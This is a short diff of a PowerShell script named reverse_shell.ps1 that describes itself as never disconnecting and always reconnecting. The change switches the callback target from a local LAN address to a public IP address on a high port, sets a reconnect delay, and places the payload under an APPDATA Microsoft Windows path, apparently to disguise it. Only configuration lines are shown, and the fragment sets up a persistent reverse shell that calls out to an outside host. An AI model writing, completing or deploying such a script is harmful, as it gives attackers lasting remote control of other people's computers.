@@ -1,6 +1,6 @@
 # reverse_shell.ps1 - Never disconnects, always reconnects
-$serverIP = "192.168.1.4"  # ← UPDATE WITH YOUR ARCH IP
-$serverPort = 4444
+$serverIP = "147.185.221.31"  # ← UPDATE WITH YOUR ARCH IP
+$serverPort = 47034
 $reconnectDelay = 15  # Seconds to wait before reconnecting
 $localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"
 
